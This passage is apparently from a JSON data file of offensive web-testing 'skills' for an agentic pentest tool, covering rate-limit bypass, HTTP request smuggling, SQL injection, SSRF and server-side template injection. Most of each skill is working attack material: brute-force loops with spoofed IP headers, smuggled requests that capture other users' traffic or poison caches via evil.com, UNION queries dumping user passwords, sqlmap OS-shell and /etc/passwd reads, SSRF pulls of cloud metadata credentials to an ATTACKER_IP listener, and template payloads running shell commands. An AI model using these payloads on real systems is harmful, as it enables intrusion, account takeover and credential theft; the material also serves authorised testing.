doubled)</li><li>Status code distribution from race test</li></ul>","n":225},{"t":"Tools","h":"<ul class=\"ml\"><li><code>python3</code> barrier-synchronized threads / <code>curl</code> parallel loops (Phase 2–3, 5) — synchronized concurrent request senders</li></ul>","n":121},{"t":"References","h":"<ul class=\"ml\"><li><a href=\"https://portswigger.net/web-security/race-conditions\" target=\"_blank\" rel=\"noopener\">PortSwigger: Race Conditions</a></li><li><a href=\"https://portswigger.net/research/smashing-the-state-machine\" target=\"_blank\" rel=\"noopener\">James Kettle: Smashing the State Machine</a></li></ul>","n":192}],"m":{"name":21,"desc":334,"body":3532,"file":4060,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":32.6},"name":{"lim":64,"pct":32.8}}}},"attack-rate-limit-bypass":{"slug":"attack-rate-limit-bypass","pillar":"operators","name":"attack-rate-limit-bypass","description":"Establish where throttling actually begins and then defeat it — X-Forwarded-For and header rotation, path case, trailing-character and query-noise variation, method switching, and username distribution against account lockout. Reach for it before brute-force, credential-stuffing or OTP-guessing exposure on a login, reset or one-per-user endpoint can be ruled in or out.","family":"web-attack","ported":true,"source":".cyberstrike/skill/attack-rate-limit-bypass/SKILL.md","summary":"Bypass rate limiting mechanisms to enable brute-force attacks, credential stuffing, or abuse of rate-limited functionality.","file":"acordia-operators/skills/attack-rate-limit-bypass/SKILL.md","used_by":["web-application"],"intro":"<p># Rate Limit Bypass</p>","secs":[{"t":"Objective","h":"<p>Bypass rate limiting mechanisms to enable brute-force attacks, credential stuffing, or abuse of rate-limited functionality.</p>","n":123},{"t":"Testing Methodology","h":"<h4 class=\"mh\">Phase 0: Baseline the Limit &amp; Function Abuse</h4><p>Establish where the unbypassed limit actually falls before claiming a bypass, and test whether a rate-limited function can simply be repeated with one session.</p><pre class=\"code\" data-lang=bash><code># Measure the limit — at which request does the 429 begin?\nfor i in $(seq 1 100); do\n  curl -s -o /dev/null -w &quot;%{http_code}\\n&quot; \\\n    -X POST https://TARGET/api/send-otp -d '{&quot;phone&quot;:&quot;1234567890&quot;}'\ndone\n\n# Vote/like stuffing — repeat a once-per-user action with a single session\nfor i in $(seq 1 50); do\n  curl -s -X POST https://TARGET/api/vote -d '{&quot;post_id&quot;:1}' \\\n    -H &quot;Cookie: session=TOKEN&quot;\ndone</code></pre><h4 class=\"mh\">Phase 1: Automated Bypass Testing</h4><pre class=\"code\" data-lang=bash><code># Full bypass test suite (5 techniques), 20 requests total, cycled round-robin\nCOUNT=20\nfor i in $(seq 1 &quot;$COUNT&quot;); do\n  case $((i % 5)) in\n    0) # X-Forwarded-For IP rotation\n       ip=&quot;$((RANDOM%254+1)).$((RANDOM%254+1)).$((RANDOM%254+1)).$((RANDOM%254+1))&quot;\n       curl -s -o /dev/null -w &quot;xff %{http_code}\\n&quot; -X POST https://TARGET/api/login \\\n         -H &quot;Content-Type: application/json&quot; -H &quot;X-Forwarded-For: $ip&quot; \\\n         -d '{&quot;email&quot;:&quot;test@test.com&quot;,&quot;password&quot;:&quot;test&quot;}' ;;\n    1) # URL case variation\n       curl -s -o /dev/null -w &quot;case %{http_code}\\n&quot; -X POST https://TARGET/API/LOGIN \\\n         -H &quot;Content-Type: application/json&quot; -d '{&quot;email&quot;:&quot;test@test.com&quot;,&quot;password&quot;:&quot;test&quot;}' ;;\n    2) # HTTP method switching\n       curl -s -o /dev/null -w &quot;method %{http_code}\\n&quot; -X PUT https://TARGET/api/login \\\n         -H &quot;Content-Type: application/json&quot; -d '{&quot;email&quot;:&quot;test@test.com&quot;,&quot;password&quot;:&quot;test&quot;}' ;;\n    3) # Random query parameter injection (new cache key)\n       curl -s -o /dev/null -w &quot;query %{http_code}\\n&quot; -X POST &quot;https://TARGET/api/login?_=$RANDOM$i&quot; \\\n         -H &quot;Content-Type: application/json&quot; -d '{&quot;email&quot;:&quot;test@test.com&quot;,&quot;password&quot;:&quot;test&quot;}' ;;\n    4) # Header-based bypass\n       curl -s -o /dev/null -w &quot;header %{http_code}\\n&quot; -X POST https://TARGET/api/login \\\n         -H &quot;Content-Type: application/json&quot; -H &quot;X-Forwarded-For: 127.0.0.1&quot; \\\n         -d '{&quot;email&quot;:&quot;test@test.com&quot;,&quot;password&quot;:&quot;test&quot;}' ;;\n  esac\ndone</code></pre><p>Tests automatically:</p><ol class=\"ml\"><li>X-Forwarded-For IP rotation</li><li>URL case variation</li><li>HTTP method switching</li><li>Random query parameter injection</li><li>Header-based bypasses</li></ol><h4 class=\"mh\">Phase 2: X-Forwarded-For Rotation</h4><pre class=\"code\" data-lang=bash><code># Rotate source IP via headers\nfor i in $(seq 1 50); do\n  IP=&quot;$((RANDOM%254+1)).$((RANDOM%254+1)).$((RANDOM%254+1)).$((RANDOM%254+1))&quot;\n  curl -s -o /dev/null -w &quot;%{http_code} &quot; \\\n    -X POST https://TARGET/api/login \\\n    -H &quot;X-Forwarded-For: $IP&quot; \\\n    -H &quot;X-Real-IP: $IP&quot; \\\n    -H &quot;X-Client-IP: $IP&quot; \\\n    -d '{&quot;email&quot;:&quot;test@test.com&quot;,&quot;password&quot;:&quot;guess&quot;}'\ndone</code></pre><h4 class=\"mh\">Phase 3: URL Manipulation</h4><pre class=\"code\" data-lang=bash><code># Path case variation\ncurl https://TARGET/API/LOGIN\ncurl https://TARGET/Api/Login\n\n# Trailing slash/dot\ncurl https://TARGET/api/login/\ncurl https://TARGET/api/login/.\n\n# Double slash\ncurl https://TARGET//api//login\n\n# Random query params (new cache key)\ncurl &quot;https://TARGET/api/login?_=$(date +%s)&quot;</code></pre><h4 class=\"mh\">Phase 4: Header Bypasses</h4><pre class=\"code\" data-lang=bash><code>curl -X POST https://TARGET/api/login \\\n  -H &quot;X-Forwarded-For: 127.0.0.1&quot;\n\ncurl -X POST https://TARGET/api/login \\\n  -H &quot;X-Forwarded-Host: localhost&quot;\n\ncurl -X POST https://TARGET/api/login \\\n  -H &quot;X-Original-URL: /api/login&quot;\n\ncurl -X POST https://TARGET/api/login \\\n  -H &quot;X-Custom-IP-Authorization: 127.0.0.1&quot;</code></pre><h4 class=\"mh\">Phase 5: Account Lockout Bypass</h4><pre class=\"code\" data-lang=bash><code># Distribute across usernames\nfor user in user1 user2 user3; do\n  curl -X POST https://TARGET/api/login \\\n    -d &quot;{\\&quot;email\\&quot;:\\&quot;$user@test.com\\&quot;,\\&quot;password\\&quot;:\\&quot;common_password\\&quot;}&quot;\ndone\n\n# IP rotation + distributed usernames = bypass</code></pre><h4 class=\"mh\">Phase 6: WAF Bypass + Rate Limit</h4><pre class=\"code\" data-lang=bash><code># Encode payload variants to avoid WAF detection, then hit the rate-limited endpoint\nfor payload in &quot;admin%27%20OR%201%3D1--&quot; &quot;admin'%20OR%201=1%23&quot; &quot;admin/**/OR/**/1=1--&quot; &quot;adm%69n' OR 1=1--&quot;; do\n  curl -s -o /dev/null -w &quot;%{http_code}\\n&quot; -X POST https://TARGET/api/login \\\n    -H &quot;Content-Type: application/json&quot; \\\n    -d &quot;{\\&quot;email\\&quot;:\\&quot;test@test.com\\&quot;,\\&quot;password\\&quot;:\\&quot;$payload\\&quot;}&quot;\ndone</code></pre>","n":4110},{"t":"What Constitutes a Finding","h":"<div class=\"tw\"><table><thead><tr><th>Finding</th><th>Severity</th></tr></thead><tbody><tr><td>Rate limit bypass on login/auth endpoint</td><td>High (P2)</td></tr><tr><td>Rate limit bypass on password reset</td><td>High (P2)</td></tr><tr><td>Rate limit bypass on OTP/2FA verification</td><td>Critical (P1)</td></tr><tr><td>Rate limit bypass on financial operations</td><td>Critical (P1)</td></tr><tr><td>Rate limit bypass on non-sensitive endpoint</td><td>Low (P4)</td></tr></tbody></table></div>","n":337},{"t":"Evidence Requirements","h":"<ul class=\"ml\"><li>Endpoint tested</li><li>Normal rate limit behavior (429 after N requests)</li><li>Bypass technique used</li><li>Successful requests beyond the limit</li><li>Count of requests that bypassed the limit</li></ul>","n":176},{"t":"Tools","h":"<ul class=\"ml\"><li><code>curl</code> round-robin loop (Phase 1) — automated 5-technique bypass testing</li><li><code>curl</code> encoded-payload loop (Phase 6) — WAF bypass via payload encoding</li></ul>","n":148},{"t":"References","h":"<ul class=\"ml\"><li><a href=\"https://owasp.org/www-community/controls/Rate_Limiting\" target=\"_blank\" rel=\"noopener\">OWASP: Rate Limiting</a></li><li><a href=\"https://www.hackerone.com/vulnerability-management/rate-limiting-bypass-techniques\" target=\"_blank\" rel=\"noopener\">HackerOne: Rate Limit Bypass</a></li></ul>","n":197}],"m":{"name":24,"desc":371,"body":5243,"file":5814,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":36.2},"name":{"lim":64,"pct":37.5}}}},"attack-request-smuggling":{"slug":"attack-request-smuggling","pillar":"operators","name":"attack-request-smuggling","description":"Desynchronise a front-end proxy from its back-end by making them disagree on where a request ends — CL.TE, TE.CL, TE.TE and HTTP/2 downgrade probes, confirmed by timing, then used to capture or rewrite another user's request. Reach for it when a CDN or load balancer forwards to a distinct origin server.","family":"web-attack","ported":true,"source":".cyberstrike/skill/attack-request-smuggling/SKILL.md","summary":"Exploit disagreements between front-end and back-end servers on request boundary parsing (Content-Length vs Transfer-Encoding) to smuggle a second request.","file":"acordia-operators/skills/attack-request-smuggling/SKILL.md","used_by":["web-application"],"intro":"<p># HTTP Request Smuggling</p>","secs":[{"t":"Objective","h":"<p>Exploit disagreements between front-end and back-end servers on request boundary parsing (Content-Length vs Transfer-Encoding) to smuggle a second request.</p>","n":155},{"t":"Testing Methodology","h":"<h4 class=\"mh\">Phase 1: Detect Smuggling</h4><p><strong>CL.TE (front uses Content-Length, back uses Transfer-Encoding):</strong></p><pre class=\"code\" data-lang=http><code>POST / HTTP/1.1\nHost: TARGET\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED</code></pre><p><strong>TE.CL (front uses Transfer-Encoding, back uses Content-Length):</strong></p><pre class=\"code\" data-lang=http><code>POST / HTTP/1.1\nHost: TARGET\nContent-Length: 3\nTransfer-Encoding: chunked\n\n8\nSMUGGLED\n0\n</code></pre><h4 class=\"mh\">Phase 2: Timing-Based Detection</h4><p>Send ambiguous request, measure response time:</p><ul class=\"ml\"><li>If back-end times out waiting for more data → smuggling may be possible</li></ul><pre class=\"code\" data-lang=bash><code># CL.TE detection (timeout = vulnerable)\nprintf 'POST / HTTP/1.1\\r\\nHost: TARGET\\r\\nContent-Length: 4\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nA\\r\\nX' | timeout 10 nc TARGET 80</code></pre><h4 class=\"mh\">Phase 3: Confirm Smuggling</h4><p><strong>CL.TE confirmed:</strong></p><pre class=\"code\" data-lang=http><code>POST / HTTP/1.1\nHost: TARGET\nContent-Length: 35\nTransfer-Encoding: chunked\n\n0\n\nGET /404-proof HTTP/1.1\nX: x</code></pre><p>If next request to <code>/</code> returns 404 or different page, smuggling is confirmed.</p><h4 class=\"mh\">Phase 4: Exploitation</h4><p><strong>Capture other user's request:</strong></p><pre class=\"code\" data-lang=http><code>POST / HTTP/1.1\nHost: TARGET\nContent-Length: 100\nTransfer-Encoding: chunked\n\n0\n\nPOST /log HTTP/1.1\nContent-Length: 10000\nContent-Type: application/x-www-form-urlencoded\n\ndata=</code></pre><p>Next user's request is appended to <code>data=</code> parameter.</p><p><strong>Bypass front-end access controls:</strong></p><pre class=\"code\" data-lang=http><code>POST / HTTP/1.1\nHost: TARGET\nContent-Length: 50\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nHost: TARGET\nX: x</code></pre><p><strong>Cache poisoning via smuggling:</strong></p><pre class=\"code\" data-lang=http><code>POST / HTTP/1.1\nHost: TARGET\nContent-Length: 100\nTransfer-Encoding: chunked\n\n0\n\nGET /static/main.js HTTP/1.1\nHost: evil.com\nX: x</code></pre><h4 class=\"mh\">Phase 5: H2.CL / H2 Smuggling</h4><pre class=\"code\" data-lang=bash><code># HTTP/2 downgrade smuggling\ncurl --http2 https://TARGET/ \\\n  -H &quot;Content-Length: 0&quot; \\\n  -H &quot;Transfer-Encoding: chunked&quot; \\\n  -d &quot;0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: TARGET\\r\\n\\r\\n&quot;</code></pre>","n":1854},{"t":"What Constitutes a Finding","h":"<div class=\"tw\"><table><thead><tr><th>Finding</th><th>Severity</th></tr></thead><tbody><tr><td>Request smuggling → capture user requests</td><td>Critical (P1)</td></tr><tr><td>Smuggling → admin access bypass</td><td>Critical (P1)</td></tr><tr><td>Smuggling → cache poisoning</td><td>Critical (P1)</td></tr><tr><td>CL.TE or TE.CL desync confirmed</td><td>High (P2)</td></tr></tbody></table></div>","n":255},{"t":"Evidence Requirements","h":"<ul class=\"ml\"><li>Smuggling variant (CL.TE, TE.CL, TE.TE, H2.CL)</li><li>Proof of desync (wrong response, timing, captured request)</li><li>Impact demonstration (auth bypass, cache poison, request capture)</li></ul>","n":177},{"t":"References","h":"<ul class=\"ml\"><li><a href=\"https://portswigger.net/web-security/request-smuggling\" target=\"_blank\" rel=\"noopener\">PortSwigger: Request Smuggling</a></li><li><a href=\"https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn\" target=\"_blank\" rel=\"noopener\">James Kettle: HTTP Desync Attacks</a></li></ul>","n":207}],"m":{"name":24,"desc":304,"body":2793,"file":3297,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":29.7},"name":{"lim":64,"pct":37.5}}}},"attack-sqli":{"slug":"attack-sqli","pillar":"operators","name":"attack-sqli","description":"Detect SQL injection in user-controlled input, fingerprint the backend database from its error text, and extract data — UNION in band, boolean and time oracles when blind, and sqlmap for the grind. Reach for it whenever a parameter can reach a database query.","family":"web-attack","ported":true,"source":".cyberstrike/skill/WEB/OWASP_WSTG_4.2/wstg-injection/SKILL.md","summary":"Detect SQL injection in any user-controlled input, fingerprint the backend database, and extract data — in-band via UNION, or blind via boolean and time oracles.","file":"acordia-operators/skills/attack-sqli/SKILL.md","used_by":["web-application"],"intro":"<p># SQL Injection</p>","secs":[{"t":"Objective","h":"<p>Detect SQL injection in any user-controlled input, fingerprint the backend database, and extract data — in-band via UNION, or blind via boolean and time oracles.</p>","n":161},{"t":"Testing Methodology","h":"<h4 class=\"mh\">Phase 1: Detection Payloads (test in every input)</h4><pre class=\"code\" data-lang=sql><code>'\n''\n' OR '1'='1\n' OR '1'='1' --\n' OR '1'='1' #\n&quot; OR &quot;1&quot;=&quot;1&quot; --\n' AND 1=1 --\n' AND 1=2 --\n1' ORDER BY 1 --\n1' ORDER BY 100 --\n' UNION SELECT NULL --</code></pre><h4 class=\"mh\">Phase 2: DB Fingerprinting (from error messages)</h4><div class=\"tw\"><table><thead><tr><th>Error Snippet</th><th>Database</th></tr></thead><tbody><tr><td><code>You have an error in your SQL syntax</code></td><td>MySQL</td></tr><tr><td><code>pg_query()</code>, <code>PSQLException</code></td><td>PostgreSQL</td></tr><tr><td><code>Microsoft SQL Server</code>, <code>Unclosed quotation mark</code></td><td>MSSQL</td></tr><tr><td><code>ORA-</code>, <code>Oracle error</code></td><td>Oracle</td></tr><tr><td><code>SQLite</code></td><td>SQLite</td></tr></tbody></table></div><h4 class=\"mh\">Phase 3: Union-Based Extraction</h4><pre class=\"code\" data-lang=sql><code>-- Step 1: Find column count\n' ORDER BY 1 -- ... ' ORDER BY N --\n' UNION SELECT NULL,NULL,... --\n\n-- Step 2: Find displayable column\n' UNION SELECT 'a',NULL,NULL --\n\n-- Step 3: Extract data\n-- MySQL:\n' UNION SELECT table_name,NULL FROM information_schema.tables --\n' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' --\n' UNION SELECT username,password FROM users --\n\n-- MSSQL:\n' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U' --\n\n-- PostgreSQL:\n' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public' --</code></pre><h4 class=\"mh\">Phase 4: Blind SQLi</h4><pre class=\"code\" data-lang=sql><code>-- Boolean-based\n' AND 1=1 --  (true response)\n' AND 1=2 --  (false response)\n' AND SUBSTRING(username,1,1)='a' --\n' AND (SELECT COUNT(*) FROM users)&gt;0 --\n\n-- Time-based\n' AND SLEEP(5) --                        (MySQL)\n'; WAITFOR DELAY '0:0:5' --              (MSSQL)\n' AND pg_sleep(5) --                     (PostgreSQL)\n' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5) -- (Oracle)</code></pre><h4 class=\"mh\">Phase 5: sqlmap Quick Reference</h4><pre class=\"code\" data-lang=bash><code># Basic scan\nsqlmap -u &quot;https://TARGET/page?id=1&quot; --batch --random-agent\n\n# POST request\nsqlmap -u &quot;https://TARGET/login&quot; --data=&quot;user=admin&amp;pass=test&quot; -p user --batch\n\n# With authentication\nsqlmap -u &quot;https://TARGET/page?id=1&quot; --cookie=&quot;session=abc123&quot; --batch\n\n# Enumerate\nsqlmap -u &quot;URL&quot; --dbs                    # List databases\nsqlmap -u &quot;URL&quot; -D dbname --tables       # List tables\nsqlmap -u &quot;URL&quot; -D db -T users --dump    # Dump table\nsqlmap -u &quot;URL&quot; --current-user           # Current DB user\nsqlmap -u &quot;URL&quot; --is-dba                 # Check DBA privs\n\n# Advanced\nsqlmap -u &quot;URL&quot; --os-shell               # OS shell\nsqlmap -u &quot;URL&quot; --file-read=/etc/passwd  # Read files\nsqlmap -u &quot;URL&quot; --tamper=space2comment,between  # WAF bypass\nsqlmap -u &quot;URL&quot; --level=5 --risk=3       # Thorough scan</code></pre>","n":2630},{"t":"What Constitutes a Finding","h":"<div class=\"tw\"><table><thead><tr><th>Finding</th><th>Severity</th></tr></thead><tbody><tr><td>Data extracted from another tenant or the credential store</td><td>Critical (P1)</td></tr><tr><td>OS command execution or file read via the DB (<code>--os-shell</code>, <code>--file-read</code>)</td><td>Critical (P1)</td></tr><tr><td>Union-based extraction of arbitrary tables</td><td>Critical (P1)</td></tr><tr><td>Blind (boolean or time) oracle confirmed extracting data</td><td>High (P2)</td></tr><tr><td>DBA privileges held by the application account (<code>--is-dba</code>)</td><td>High (P2)</td></tr><tr><td>Database or schema names disclosed</td><td>Medium (P3)</td></tr><tr><td>Verbose SQL error disclosing the engine or query fragment</td><td>Low (P4)</td></tr></tbody></table></div>","n":557},{"t":"Evidence Requirements","h":"<ul class=\"ml\"><li>Injection point (parameter, endpoint, HTTP method)</li><li>Payload sent and the response that differentiates true from false</li><li>Database engine identified, with the error snippet or fingerprint that named it</li><li>For extraction: the rows returned, redacted of credential values</li><li>For time-based: paired timings showing the delay tracks the payload</li></ul>","n":339},{"t":"Tools","h":"<ul class=\"ml\"><li><code>sqlmap</code> (Phase 5) — automated detection, enumeration, extraction and WAF-bypass tampering</li><li><code>curl</code> — manual payload probing and boolean/time-oracle comparison</li></ul>","n":161},{"t":"References","h":"<ul class=\"ml\"><li><a href=\"https://portswigger.net/web-security/sql-injection\" target=\"_blank\" rel=\"noopener\">PortSwigger: SQL injection</a></li><li><a href=\"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection\" target=\"_blank\" rel=\"noopener\">OWASP WSTG: Testing for SQL Injection</a></li></ul>","n":281}],"m":{"name":11,"desc":259,"body":4277,"file":4732,"dband":"under","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":25.3},"name":{"lim":64,"pct":17.2}}}},"attack-ssrf":{"slug":"attack-ssrf","pillar":"operators","name":"attack-ssrf","description":"Make the server fetch on your behalf and steer that fetch inward — cloud metadata at 169.254.169.254 across AWS, GCP, Azure and DigitalOcean, internal hosts and ports, reached through decimal, hexadecimal, IPv6, redirect and DNS-rebinding filter bypasses, with an out-of-band listener for the blind case. Reach for it when a webhook, importer, preview or PDF and image generator takes a URL.","family":"web-attack","ported":true,"source":".cyberstrike/skill/attack-ssrf/SKILL.md","summary":"Force the server to make requests to internal resources, cloud metadata endpoints, or attacker-controlled servers.","file":"acordia-operators/skills/attack-ssrf/SKILL.md","used_by":["web-application"],"intro":"<p># Server-Side Request Forgery (SSRF)</p>","secs":[{"t":"Objective","h":"<p>Force the server to make requests to internal resources, cloud metadata endpoints, or attacker-controlled servers.</p>","n":114},{"t":"Testing Methodology","h":"<h4 class=\"mh\">Phase 1: Identify URL Input Points</h4><p>Look for parameters that accept URLs:</p><ul class=\"ml\"><li>Webhook URLs, callback URLs</li><li>File import/export (URL-based)</li><li>PDF/image generation from URL</li><li>URL preview/unfurling</li><li>Proxy/redirect endpoints</li></ul><h4 class=\"mh\">Phase 2: Basic SSRF Payloads</h4><pre class=\"code\" data-lang=bash><code># Start callback listener — logs every inbound request to ssrf_evidence.json\npython3 - &lt;&lt;'PY' &amp;\nimport http.server, json, datetime\n\nLOG = &quot;ssrf_evidence.json&quot;\n\nclass Handler(http.server.BaseHTTPRequestHandler):\n    def _log(self):\n        entry = {\n            &quot;time&quot;: datetime.datetime.utcnow().isoformat(),\n            &quot;method&quot;: self.command,\n            &quot;path&quot;: self.path,\n            &quot;headers&quot;: dict(self.headers),\n            &quot;client&quot;: self.client_address[0],\n        }\n        with open(LOG, &quot;a&quot;) as f:\n            f.write(json.dumps(entry) + &quot;\\n&quot;)\n        self.send_response(200)\n        self.end_headers()\n\n    do_GET = do_POST = _log\n\nhttp.server.HTTPServer((&quot;0.0.0.0&quot;, 8888), Handler).serve_forever()\nPY\n# Substitute an out-of-band collaborator (e.g. interact.sh, Burp Collaborator)\n# when the target network cannot reach your host directly.\n\n# Test URL parameters\ncurl &quot;https://TARGET/api/fetch?url=http://ATTACKER_IP:8888/ssrf-test&quot;\ncurl &quot;https://TARGET/api/preview?link=http://127.0.0.1:80&quot;</code></pre><h4 class=\"mh\">Phase 3: Cloud Metadata</h4><pre class=\"code\" data-lang=bash><code># AWS IMDSv1\ncurl &quot;https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/&quot;\ncurl &quot;https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&quot;\ncurl &quot;https://TARGET/fetch?url=http://169.254.169.254/latest/user-data/&quot;\n\n# GCP\ncurl &quot;https://TARGET/fetch?url=http://metadata.google.internal/computeMetadata/v1/&quot;\n# (requires header: Metadata-Flavor: Google)\n\n# Azure\ncurl &quot;https://TARGET/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01&quot;\n# (requires header: Metadata: true)\n\n# DigitalOcean\ncurl &quot;https://TARGET/fetch?url=http://169.254.169.254/metadata/v1/&quot;</code></pre><h4 class=\"mh\">Phase 4: Filter Bypass</h4><pre class=\"code\" data-lang=bash><code># Decimal IP (127.0.0.1 = 2130706433)\ncurl &quot;https://TARGET/fetch?url=http://2130706433/&quot;\n\n# Hex IP\ncurl &quot;https://TARGET/fetch?url=http://0x7f000001/&quot;\n\n# IPv6\ncurl &quot;https://TARGET/fetch?url=http://[::1]/&quot;\n\n# Alternate loopback notations\ncurl &quot;https://TARGET/fetch?url=http://0.0.0.0/&quot;\ncurl &quot;https://TARGET/fetch?url=http://localhost/&quot;\ncurl &quot;https://TARGET/fetch?url=http://127.1/&quot;\ncurl &quot;https://TARGET/fetch?url=http://017700000001/&quot;   # octal\n\n# URL encoding\ncurl &quot;https://TARGET/fetch?url=http://%31%32%37%2e%30%2e%30%2e%31/&quot;\n\n# DNS rebinding (use your own DNS server)\ncurl &quot;https://TARGET/fetch?url=http://rebind.127.0.0.1.nip.io/&quot;\n\n# Redirect bypass\ncurl &quot;https://TARGET/fetch?url=http://ATTACKER/redirect?to=http://169.254.169.254/&quot;\n\n# Protocol smuggling\ncurl &quot;https://TARGET/fetch?url=gopher://127.0.0.1:6379/_INFO&quot;\ncurl &quot;https://TARGET/fetch?url=gopher://127.0.0.1:6379/_SET%20key%20value&quot;\ncurl &quot;https://TARGET/fetch?url=dict://127.0.0.1:6379/SET:key:value&quot;</code></pre><h4 class=\"mh\">Phase 5: Internal Port Scanning</h4><pre class=\"code\" data-lang=bash><code># Scan common internal ports\nfor port in 80 443 8080 8443 3306 5432 6379 27017 9200 11211; do\n  curl -s -o /dev/null -w &quot;%{http_code}&quot; &quot;https://TARGET/fetch?url=http://127.0.0.1:$port/&quot; &amp;\ndone\nwait</code></pre>","n":3187},{"t":"What Constitutes a Finding","h":"<div class=\"tw\"><table><thead><tr><th>Finding</th><th>Severity</th></tr></thead><tbody><tr><td>Cloud metadata access (credentials)</td><td>Critical (P1)</td></tr><tr><td>Internal network access</td><td>High (P2)</td></tr><tr><td>Out-of-band HTTP callback</td><td>Medium (P3)</td></tr><tr><td>Blind SSRF (timing-based)</td><td>Medium (P3)</td></tr><tr><td>File read via file:// protocol</td><td>Critical (P1)</td></tr><tr><td>gopher:// protocol access</td><td>High (P2)</td></tr></tbody></table></div>","n":322},{"t":"Evidence Requirements","h":"<ul class=\"ml\"><li>URL parameter with SSRF payload</li><li>Response containing internal data or metadata</li><li>For blind SSRF: OOB callback evidence (Phase 2 listener)</li><li>Network topology information gathered</li></ul>","n":180},{"t":"Tools","h":"<ul class=\"ml\"><li><code>python3 -m http.server</code>-style listener (Phase 2) — OOB callback listener; substitute an external collaborator when the target cannot reach your host directly</li><li><code>curl</code> — manual SSRF testing</li></ul>","n":191},{"t":"References","h":"<ul class=\"ml\"><li><a href=\"https://portswigger.net/web-security/ssrf\" target=\"_blank\" rel=\"noopener\">PortSwigger: SSRF</a></li><li><a href=\"https://owasp.org/www-community/attacks/Server_Side_Request_Forgery\" target=\"_blank\" rel=\"noopener\">OWASP: SSRF</a></li></ul>","n":149}],"m":{"name":11,"desc":391,"body":4312,"file":4877,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":38.2},"name":{"lim":64,"pct":17.2}}}},"attack-ssti":{"slug":"attack-ssti","pillar":"operators","name":"attack-ssti","description":"Confirm server-side template injection and drive it to code execution — arithmetic and syntax probes that fingerprint Jinja2, Twig, FreeMarker, Velocity and ERB, then the engine-specific escape from the sandbox to the runtime. Reach for it when input is rendered back through a template rather than merely echoed.","family":"web-attack","ported":true,"source":".cyberstrike/skill/attack-ssti/SKILL.md","summary":"Detect and exploit server-side template injection to achieve code execution on the server.","file":"acordia-operators/skills/attack-ssti/SKILL.md","used_by":["web-application"],"intro":"<p># Server-Side Template Injection (SSTI)</p>","secs":[{"t":"Objective","h":"<p>Detect and exploit server-side template injection to achieve code execution on the server.</p>","n":90},{"t":"Testing Methodology","h":"<h4 class=\"mh\">Phase 1: Detection</h4><pre class=\"code\" data-lang=bash><code># Automated SSTI detection across template engines — tplmap marks the injection\n# point with `*` and fingerprints Jinja2/Twig/FreeMarker/Velocity/ERB/etc.\ntplmap -u &quot;https://TARGET/search?q=*&quot;\n\n# Quick mode (math payloads only) — manual probe\nfor payload in '{{7*7}}' '${7*7}' '&lt;%= 7*7 %&gt;' '#{7*7}'; do\n  encoded=$(python3 -c &quot;import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))&quot; &quot;$payload&quot;)\n  echo &quot;== $payload ==&quot; \n  curl -s &quot;https://TARGET/render?template=$encoded&quot; | grep -o '.\\{0,20\\}49.\\{0,20\\}'\ndone</code></pre><h4 class=\"mh\">Phase 2: Generic Detection Payloads</h4><p>Inject into every user-controlled parameter:</p><pre class=\"code\"><code>{{7*7}}           → 49 (Jinja2, Twig)\n${7*7}            → 49 (FreeMarker, Velocity, EL)\n&lt;%= 7*7 %&gt;        → 49 (ERB, JSP)\n#{7*7}            → 49 (Thymeleaf)\n{{7*'7'}}         → 7777777 (Jinja2 string multiplication)\n${{&lt;%[%'&quot;}}%\\.    → polyglot; renders or errors on any engine in the set\n*{7*7}            → 49 (Spring EL selection)\n{7*7}             → 49 (Smarty)</code></pre><h4 class=\"mh\">Phase 3: Engine Fingerprinting</h4><pre class=\"code\"><code>{{config.items()}}                    → Jinja2 (Flask/Python)\n{{request.application.__globals__}}   → Jinja2\n${T(java.lang.Runtime)}               → Spring EL\n&lt;#assign x=1&gt;${x}                     → FreeMarker\n{{_self.env.getFilter('id')}}         → Twig (PHP)\n&lt;%= system('id') %&gt;                   → ERB (Ruby)</code></pre><h4 class=\"mh\">Phase 4: Exploitation</h4><p><strong>Jinja2 (Python/Flask):</strong></p><pre class=\"code\"><code>{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n{{''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate()}}</code></pre><p><strong>FreeMarker (Java):</strong></p><pre class=\"code\"><code>${&quot;freemarker.template.utility.Execute&quot;?new()(&quot;id&quot;)}</code></pre><p><strong>Twig (PHP):</strong></p><pre class=\"code\"><code>{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}</code></pre><p><strong>ERB (Ruby):</strong></p><pre class=\"code\"><code>&lt;%= `id` %&gt;\n&lt;%= system('id') %&gt;</code></pre><p><strong>FreeMarker (Java) — assign variant:</strong></p><pre class=\"code\"><code>&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt;${ex(&quot;id&quot;)}</code></pre><p><strong>Pebble (Java):</strong></p><pre class=\"code\"><code>{% set cmd='id' %}{% set bytes=cmd.getClass().forName('java.lang.Runtime').getRuntime().exec(cmd) %}</code></pre><p><strong>Smarty (PHP):</strong></p><pre class=\"code\"><code>{system('id')}</code></pre><p><strong>Handlebars (JS):</strong> detection <code>{{this}}</code>; escalate through the block helper —</p><pre class=\"code\"><code>{{#with &quot;s&quot; as |string|}}...{{/with}}</code></pre><h4 class=\"mh\">Phase 5: POST-based Injection</h4><pre class=\"code\" data-lang=bash><code># Test POST parameters\nfor payload in '{{7*7}}' '${7*7}' '&lt;%= 7*7 %&gt;'; do\n  curl -s -X POST 